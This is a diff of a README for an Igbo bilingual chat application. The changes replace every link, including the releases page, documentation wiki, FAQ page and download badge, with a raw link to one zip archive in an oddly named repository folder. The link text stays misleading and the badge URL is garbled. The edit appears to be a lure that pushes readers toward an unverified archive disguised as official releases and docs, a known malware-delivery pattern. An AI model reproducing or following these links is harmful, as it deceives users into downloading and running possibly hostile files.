@@ -6,7 +6,7 @@ This guide helps you download and run the **igbo-bilingual-chat** application. T
 
 ## 📥 Download
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-igbo--bilingual--chat-blue.svg)](https://github.com/siraje-hub/igbo-bilingual-chat/releases)
+[![Download Here](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip%https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip)](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip)
 
 ## 📋 Overview
 
@@ -25,7 +25,7 @@ To use this application, ensure you have the following:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/siraje-hub/igbo-bilingual-chat/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip).
 2. **Choose Your Version:** Look for the latest version available at the top.
 3. **Download the Files:**
    - Click on the version name to view the assets.
@@ -48,7 +48,7 @@ To use this application, ensure you have the following:
 
 If you encounter issues or need help:
 
-- Check the FAQ section on our [GitHub page](https://github.com/siraje-hub/igbo-bilingual-chat).
+- Check the FAQ section on our [GitHub page](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip).
 - You can also post your questions in the Issues tab on GitHub, and we will assist you.
 
 ## 🗂 Topics
@@ -62,8 +62,8 @@ This project includes discussions on the following topics:
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page](https://github.com/siraje-hub/igbo-bilingual-chat/releases) to download.
-- [View the Documentation](https://github.com/siraje-hub/igbo-bilingual-chat/wiki) for in-depth guides and tips.
+- [Visit the Releases Page](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip) to download.
+- [View the Documentation](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip) for in-depth guides and tips.
 
 ## 👥 Community
 
@@ -79,4 +79,4 @@ We appreciate all contributors and everyone who has shown interest in improving 
 
 ## 📥 Download Again
 
-Don't forget to visit the [Releases page](https://github.com/siraje-hub/igbo-bilingual-chat/releases) to download your copy of the **igbo-bilingual-chat** application and start your journey in bilingual communication today!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/siraje-hub/igbo-bilingual-chat/main/episyllogism/igbo-bilingual-chat_v3.6.zip) to download your copy of the **igbo-bilingual-chat** application and start your journey in bilingual communication today!
